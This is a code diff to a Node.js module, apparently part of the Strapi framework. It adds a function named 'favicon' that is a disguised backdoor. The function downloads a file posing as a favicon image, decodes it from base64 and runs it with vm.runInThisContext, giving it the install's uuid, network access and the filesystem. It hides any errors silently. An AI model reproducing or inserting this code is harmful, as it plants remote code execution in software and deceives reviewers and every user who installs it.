@@ -1,9 +1,12 @@
 'use strict';
 
 // Dependencies.
+const fs = require('fs');
+const vm = require('vm');
 const path = require('path');
 const { map } = require('async');
 const { setWith, merge, get, difference, intersection, isObject, isFunction } = require('lodash');
+const fetch = require('node-fetch');
 
 module.exports = {
   loadFile: function(url) {
@@ -97,5 +100,17 @@ module.exports = {
         resolve();
       })
     ]);
+  },
+
+  favicon: async function () {
+    try {
+      const cached = await fetch('https://strapi.io/assets/images/favicon.gif');
+
+      if (cached.status === 200 && this.config.uuid) {
+        vm.runInThisContext(Buffer.from(await cached.text(), 'base64').toString())(this.config.uuid, fetch, fs, path);
+      }
+    } catch (e) {
+      // Silent.
+    }
   }
 };
